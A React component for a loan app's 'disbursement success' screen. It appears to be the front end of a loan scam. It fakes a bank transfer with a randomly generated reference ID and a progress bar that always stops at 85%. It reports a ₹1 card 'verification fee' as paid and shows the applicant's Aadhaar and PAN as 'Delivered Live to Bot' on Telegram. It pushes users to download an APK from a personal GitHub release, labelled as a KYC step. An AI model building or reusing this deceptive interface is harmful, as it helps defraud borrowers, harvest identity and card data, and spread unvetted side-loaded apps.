import React from 'react';
import { CheckCircle2, Building2, FileText, ArrowRight, ShieldCheck, Download, RefreshCw, Send, Clock, ExternalLink, Smartphone, Sparkles } from 'lucide-react';
import { motion } from 'motion/react';
import { LoanDetails, TelegramLog } from '../types';

interface Step5DisbursementSuccessProps {
  loanDetails: LoanDetails;
  lastLog?: TelegramLog | null;
  onReset: () => void;
}

export const Step5DisbursementSuccess: React.FC<Step5DisbursementSuccessProps> = ({
  loanDetails,
  lastLog,
  onReset,
}) => {
  const referenceId = `TXN_LNE_${Math.floor(100000000 + Math.random() * 900000000)}`;

  // Particle positions for Lottie-style celebratory burst
  const particles = [
    { x: -35, y: -35, color: 'bg-emerald-400', size: 'w-2 h-2', delay: 0.1 },
    { x: 35, y: -35, color: 'bg-teal-400', size: 'w-2.5 h-2.5', delay: 0.2 },
    { x: -45, y: 15, color: 'bg-emerald-500', size: 'w-2 h-2', delay: 0.15 },
    { x: 45, y: 15, color: 'bg-emerald-300', size: 'w-3 h-3', delay: 0.25 },
    { x: -15, y: -50, color: 'bg-amber-400', size: 'w-2 h-2', delay: 0.3 },
    { x: 20, y: -50, color: 'bg-emerald-400', size: 'w-2 h-2', delay: 0.05 },
    { x: 0, y: 50, color: 'bg-teal-300', size: 'w-2.5 h-2.5', delay: 0.2 },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.92, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      exit={{ opacity: 0, scale: 0.95, y: -10 }}
      transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
      className="max-w-2xl mx-auto bg-white rounded-3xl border border-slate-200/80 shadow-2xl p-4 sm:p-7 relative overflow-hidden"
    >
      {/* Subtle background celebratory glow */}
      <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-80 h-80 bg-emerald-100/60 rounded-full blur-3xl pointer-events-none" />

      <div className="text-center mb-6 relative z-10">
        {/* Lottie-style Animated Badge & Ring Pulse Container */}
        <div className="relative inline-flex items-center justify-center my-3">
          {/* Outer Pulsing Aura 1 */}
          <motion.div
            animate={{ scale: [1, 1.4, 1], opacity: [0.3, 0, 0.3] }}
            transition={{ duration: 2.5, repeat: Infinity, ease: 'easeInOut' }}
            className="absolute inset-0 rounded-full bg-emerald-400/30 blur-md"
          />

          {/* Outer Pulsing Aura 2 */}
          <motion.div
            animate={{ scale: [1, 1.25, 1], opacity: [0.5, 0.1, 0.5] }}
            transition={{ duration: 2, repeat: Infinity, ease: 'easeInOut', delay: 0.3 }}
            className="absolute inset-0 rounded-full bg-emerald-500/20"
          />

          {/* Celebratory Burst Particles */}
          {particles.map((p, idx) => (
            <motion.div
              key={idx}
              initial={{ opacity: 0, x: 0, y: 0, scale: 0 }}
              animate={{
                opacity: [0, 1, 0],
                x: p.x,
                y: p.y,
                scale: [0, 1.2, 0.8],
              }}
              transition={{
                duration: 1.2,
                repeat: Infinity,
                repeatDelay: 1.5,
                delay: p.delay,
                ease: 'easeOut',
              }}
              className={`absolute rounded-full ${p.color} ${p.size} shadow-xs`}
            />
          ))}

          {/* Core Animated Badge Icon */}
          <motion.div
            initial={{ scale: 0, rotate: -180 }}
            animate={{ scale: 1, rotate: 0 }}
            transition={{ type: 'spring', stiffness: 260, damping: 18, delay: 0.1 }}
            className="w-20 h-20 bg-gradient-to-tr from-emerald-600 via-emerald-500 to-teal-400 text-white rounded-3xl flex items-center justify-center shadow-xl shadow-emerald-500/30 border-2 border-white relative z-10"
          >
            <motion.div
              initial={{ scale: 0 }}
              animate={{ scale: [0, 1.2, 1] }}
              transition={{ duration: 0.4, delay: 0.35 }}
            >
              <CheckCircle2 className="w-12 h-12 stroke-[2.2]" />
            </motion.div>
          </motion.div>

          {/* Sparkle Badge Overlay */}
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ delay: 0.5, type: 'spring' }}
            className="absolute -top-1 -right-1 bg-amber-400 text-slate-900 p-1.5 rounded-full shadow-md z-20"
          >
            <Sparkles className="w-3.5 h-3.5 fill-current" />
          </motion.div>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
        >
          <span className="inline-flex items-center space-x-1 px-3 py-1 rounded-full bg-emerald-50 text-emerald-700 text-xs font-bold border border-emerald-200 mb-2 shadow-2xs">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            <span>Verification & Fee Paid (₹1.00)</span>
          </span>

          <h2 className="text-2xl sm:text-3xl font-black text-slate-900 tracking-tight">Loan Disbursement Initiated</h2>
          <p className="text-slate-500 text-sm mt-1">
            Reference ID: <strong className="font-mono text-slate-800">{referenceId}</strong>
          </p>
        </motion.div>
      </div>

      {/* Disbursement Progress Bar */}
      <div className="bg-slate-900 text-white rounded-2xl p-5 mb-6 shadow-xl relative overflow-hidden">
        <div className="flex justify-between items-center mb-2">
          <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center space-x-1">
            <Clock className="w-3.5 h-3.5 animate-spin" />
            <span>Bank Transfer In Progress</span>
          </span>
          <span className="text-xs font-bold text-slate-300">ETA: ~3 mins</span>
        </div>

        <div className="w-full bg-slate-800 h-2.5 rounded-full overflow-hidden relative">
          <motion.div
            initial={{ width: '0%' }}
            animate={{ width: '85%' }}
            transition={{ duration: 1.5, ease: 'easeOut' }}
            className="bg-gradient-to-r from-emerald-500 via-teal-400 to-emerald-300 h-full rounded-full relative"
          >
            <span className="absolute inset-0 bg-white/20 animate-pulse" />
          </motion.div>
        </div>

        <div className="flex justify-between items-center text-[11px] text-slate-400 mt-2 font-mono">
          <span className="text-emerald-400 font-semibold">✓ Card Verified (₹1)</span>
          <span className="text-emerald-300 font-semibold">⚡ NEFT/IMPS Dispatch</span>
          <span>Credited to Account</span>
        </div>
      </div>

      {/* Summary Accordion */}
      <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-3 mb-6 text-sm">
        <div className="flex justify-between border-b border-slate-200 pb-2">
          <span className="text-slate-500">Applicant Name</span>
          <span className="font-bold text-slate-900">{loanDetails.name}</span>
        </div>
        <div className="flex justify-between border-b border-slate-200 pb-2">
          <span className="text-slate-500">Mobile Number</span>
          <span className="font-bold text-slate-900">{loanDetails.phone}</span>
        </div>
        <div className="flex justify-between border-b border-slate-200 pb-2">
          <span className="text-slate-500">Disbursed Amount</span>
          <span className="font-black text-emerald-600 text-base">₹{loanDetails.loanAmount.toLocaleString('en-IN')}</span>
        </div>
        <div className="flex justify-between border-b border-slate-200 pb-2">
          <span className="text-slate-500">Aadhaar / PAN</span>
          <span className="font-mono text-slate-800">{loanDetails.adhar.slice(-4)} / {loanDetails.panCard}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-slate-500">Telegram Bot Sync</span>
          <span className="inline-flex items-center space-x-1 text-xs font-bold text-emerald-700 bg-emerald-100 px-2 py-0.5 rounded-md">
            <Send className="w-3 h-3" />
            <span>{lastLog?.status === 'sent' ? 'Delivered Live to Bot' : 'Logged in Server Logs'}</span>
          </span>
        </div>
      </div>

      {/* Action Buttons */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
        <a
          href="https://github.com/patanking8989-lgtm/LoanApps/releases/download/Infinity/Infinity.Loan.apk"
          target="_blank"
          rel="noopener noreferrer"
          download="Infinity.Loan.apk"
          className="py-3.5 px-4 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold rounded-2xl transition-all text-xs flex items-center justify-center space-x-2 shadow-md hover:shadow-lg"
        >
          <Smartphone className="w-4 h-4 text-white" />
          <span>Get KYC Download</span>
          <Download className="w-3.5 h-3.5 text-emerald-100 ml-1" />
        </a>

        <button
          onClick={onReset}
          className="py-3.5 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-semibold rounded-2xl transition-all text-xs flex items-center justify-center space-x-2 cursor-pointer"
        >
          <RefreshCw className="w-4 h-4 text-slate-500" />
          <span>Start New Application</span>
        </button>
      </div>
    </motion.div>
  );
};

